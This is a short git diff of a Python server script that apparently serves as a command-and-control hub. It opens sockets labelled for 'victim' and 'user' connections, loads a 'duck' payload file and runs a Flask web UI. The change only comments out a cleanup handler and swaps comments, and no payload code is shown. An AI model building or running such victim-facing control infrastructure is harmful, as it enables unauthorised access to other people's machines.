@@ -70,10 +70,10 @@ def listen_for_user_connections():
 
 
 # Handle interrupts to cleanup sockets
-def sigint_handler(signal, frame):
-    with common.lock:
-        [sock.close() for sock in common.sockets]
-    sys.exit(0)
+# def sigint_handler(signal, frame):
+#     with common.lock:
+#         [sock.close() for sock in common.sockets]
+#     sys.exit(0)
 
 
 # run web ui and handle client connections
@@ -86,10 +86,10 @@ if __name__ == '__main__':
     duck = file.read()
     file.close()
 
-    # setup socket for users
+    # setup socket for victim
     victim_server_addr = ("0.0.0.0", 1337)
 
-    # setup socket for victim communication
+    # setup socket for user communication
     user_server_addr = ("0.0.0.0", 1338)
 
     vs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -109,4 +109,4 @@ if __name__ == '__main__':
     flask_app.register_blueprint(controllers.api.api_routes)
     flask_app.run()
 
-    signal.signal(signal.SIGINT, sigint_handler)
+    #signal.signal(signal.SIGINT, sigint_handler)
